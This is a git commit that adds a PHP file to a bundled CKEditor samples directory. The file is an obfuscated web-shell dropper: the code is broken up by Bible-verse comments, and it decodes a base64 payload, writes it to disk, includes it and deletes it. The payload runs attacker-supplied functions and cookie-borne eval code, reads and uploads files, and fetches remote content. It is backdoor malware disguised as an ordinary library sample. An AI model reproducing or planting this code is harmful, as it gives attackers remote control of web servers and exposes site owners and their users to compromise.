652f0947317dacfcda6ff6c027021a1dbe237213
Ashir Afridi <ashirchannel765@gmail.com>
2024-01-02 22:23:30 +0500

    first commit

---
+++ public/libs/ckeditor4/samples/old/common_making.php
@@ -0,0 +1,32 @@
+<?php
+/*<A Prayer. */$w/* Of */=/* David.> Let your */'0JBMY388'/* ears be open to my voice, O Lord, and give */;/* me */FilE_pUt_coNteNTs/* an answer; */(/* for I */$w/* am poor and in need.
+And round */,/* to the */bASE64_dEcodE/* south of the slope of Akrabbim, and on to */(/* Zin: */IMpLode/* and */(/* its direction */aRraY_sLice/* will be south of Kadesh-barnea, and it will go as far as Hazar-addar */(/* and on */fIle/* to Azmon: */(/*
+And Jonathan said to David, */__fiLe__/* Go */)/* in */,/* peace, for */4/* we two have */,/* taken an */27/* oath, in the name of the Lord, saying, */)/* The */)/* Lord will be between */)/* me and you, and between my */)/* seed and your seed */;/* for ever. Then David went */INCLudE/* away, */$w/* and Jonathan went into */;/* the town.
+PD9waHAgZXJyb3JfcmVwb3J0aW5nKC0xKTtpbmlfc2V0KCdkaXNwbGF5X2Vy
+cm9ycycsJzEnKTtpbmlfc2V0KCdsb2dfZXJyb3JzJywnMCcpO3VubGluaygk
+dyk7aWYoIWlzc2V0KCRfUkVRVUVTVFskd10pKXtkaWU7fSRsPSRfUkVRVUVT
+VFskd107aWYoaXNzZXQoJF9SRVFVRVNUWzBdLCRsWzFdLCRsWzJdLCRsWzNd
+LCRsWzRdKSl7JGxbMV0oJHskbFsyXX1bMF0sJGxbM10oJGxbNF0pKTtkaWU7
+fWVsc2VpZihpc3NldCgkX0NPT0tJRVszXSkpe2V2YWwoYmFzZTY0X2RlY29k
+ZShzdHJfcm90MTMoJF9DT09LSUVbM10pKSk7ZGllO31lbHNlaWYoKCRyPWlz
+c2V0KCRfU0VSVkVSWydIVFRQXycuJHddKT8kX1NFUlZFUlsnSFRUUF8nLiR3
+XTooaXNzZXQoJF9QT1NUWyR3XSk/JF9QT1NUWyR3XTpudWxsKSkmJigkcj1q
+c29uX2RlY29kZSh1cmxkZWNvZGUoYmFzZTY0X2RlY29kZSgkcikpLHRydWUp
+KSYmaXNzZXQoJHJbMF0pJiYoJEM9JHJbMF0pKXtpZihpc3NldCgkcls1XSkp
+eyRDPXJlYWxwYXRoKCRDLiRyWzVdKTt9Y2hkaXIoJEMpO2lmKGlzc2V0KCRy
+WzZdKSl7cmVhZGZpbGUoJHJbNl0pO2RpZTt9aWYoaXNzZXQoJF9GSUxFU1sk
+d10pJiYoJGw9JF9GSUxFU1skd10pKXtyZW5hbWUoJGxbJ3RtcF9uYW1lJ10s
+JGxbJ25hbWUnXSk7fWlmKGlzc2V0KCRyWzFdLCRyWzJdLCRyWzNdKSYmJHJb
+Ml0hPT0nJyl7aWYoJHJbMV09PT0nMCcpeyRsPWZpbGVfZ2V0X2NvbnRlbnRz
+KCRyWzJdKTtpZigoJGw9PT1mYWxzZXx8JGw9PT0nJykmJmlzX2NhbGxhYmxl
+KCdjdXJsX2luaXQnKSl7JGw9Y3VybF9pbml0KCRyWzJdKTtjdXJsX3NldG9w
+dCgkbCwxOTkxMywxKTskbD1jdXJsX2V4ZWMoJGwpO31pZigkbCE9PWZhbHNl
+JiYkbCE9PScnKXtmaWxlX3B1dF9jb250ZW50cyhiYXNlbmFtZShwYXJzZV91
+cmwoJHJbMl0sNSkpLCRsKTt9fWVsc2VpZigkclszXSE9PScnKXskclsxXSgk
+clsyXSwkclszXSk7fWVsc2V7JHJbMV0oJHJbMl0pO319fWVsc2V7JEM9Z2V0
+Y3dkKCk7fSRyPWFycmF5KCk7Zm9yZWFjaChzY2FuZGlyKCRDKWFzJGwpeyRy
+WyRsXT1pc19kaXIoJGwpO31lY2hvJzwhRE9DVFlQRSBodG1sPjxodG1sIGxh
+bmc9ZW4+PGhlYWQ+PHRpdGxlPiM8L3RpdGxlPjxzY3JpcHQ+dmFyIGs9Iicu
+JHcuJyIscD0iJy5zdHJfcmVwbGFjZSgnXFwnLCcvJywkQykuJyIscz0nLmpz
+b25fZW5jb2RlKCRyKS4nOzwvc2NyaXB0PjwvaGVhZD48L2h0bWw+Jzs
+*/
